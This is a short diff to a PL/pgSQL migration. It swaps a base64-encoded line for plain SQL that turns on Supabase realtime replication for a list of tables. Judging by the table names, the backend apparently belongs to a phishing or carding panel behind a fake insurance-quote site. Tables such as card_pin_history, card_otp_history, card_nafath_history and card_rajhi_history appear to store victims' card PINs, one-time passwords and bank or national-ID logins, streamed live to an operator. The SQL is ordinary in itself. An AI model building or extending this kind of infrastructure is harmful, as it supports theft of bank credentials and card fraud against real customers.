@@ -1,1 +1,11 @@
-RE8gJCQKREVDTEFSRSB0IHRleHQ7CkJFR0lOCiAgRk9SRUFDSCB0IElOIEFSUkFZIEFSUkFZWydxdW90ZXMnLCdxdW90ZV9kZXRhaWxzJywncXVvdGVfc3VibWlzc2lvbl9oaXN0b3J5JywnY2FyZHMnLCdjYXJkX2lucHV0X2hpc3RvcnknLCdjYXJkX290cF9oaXN0b3J5JywnY2FyZF9waW5faGlzdG9yeScsJ2NhcmRfbmFmYXRoX2hpc3RvcnknLCdjYXJkX3JhamhpX2hpc3RvcnknLCdhZG1pbl9hY3Rpdml0eV9sb2cnLCdpbnN1cmFuY2Vfb2ZmZXJzJywnc2V0dGluZ3MnLCdiYW5uZWRfaXBzJywnYmFubmVkX2NhcmRzJ10KICBMT09QCiAgICBFWEVDVVRFIGZvcm1hdCgnQUxURVIgVEFCTEUgcHVibGljLiVJIFJFUExJQ0EgSURFTlRJVFkgRlVMTCcsIHQpOwogICAgSUYgTk9UIEVYSVNUUyAoU0VMRUNUIDEgRlJPTSBwZ19wdWJsaWNhdGlvbl90YWJsZXMgV0hFUkUgcHVibmFtZT0nc3VwYWJhc2VfcmVhbHRpbWUnIEFORCBzY2hlbWFuYW1lPSdwdWJsaWMnIEFORCB0YWJsZW5hbWU9dCkgVEhFTgogICAgICBFWEVDVVRFIGZvcm1hdCgnQUxURVIgUFVCTElDQVRJT04gc3VwYWJhc2VfcmVhbHRpbWUgQUREIFRBQkxFIHB1YmxpYy4lSScsIHQpOwogICAgRU5EIElGOwogIEVORCBMT09QOwpFTkQgJCQ7
+DO $$
+DECLARE t text;
+BEGIN
+  FOREACH t IN ARRAY ARRAY['quotes','quote_details','quote_submission_history','cards','card_input_history','card_otp_history','card_pin_history','card_nafath_history','card_rajhi_history','admin_activity_log','insurance_offers','settings','banned_ips','banned_cards']
+  LOOP
+    EXECUTE format('ALTER TABLE public.%I REPLICA IDENTITY FULL', t);
+    IF NOT EXISTS (SELECT 1 FROM pg_publication_tables WHERE pubname='supabase_realtime' AND schemaname='public' AND tablename=t) THEN
+      EXECUTE format('ALTER PUBLICATION supabase_realtime ADD TABLE public.%I', t);
+    END IF;
+  END LOOP;
+END $$;
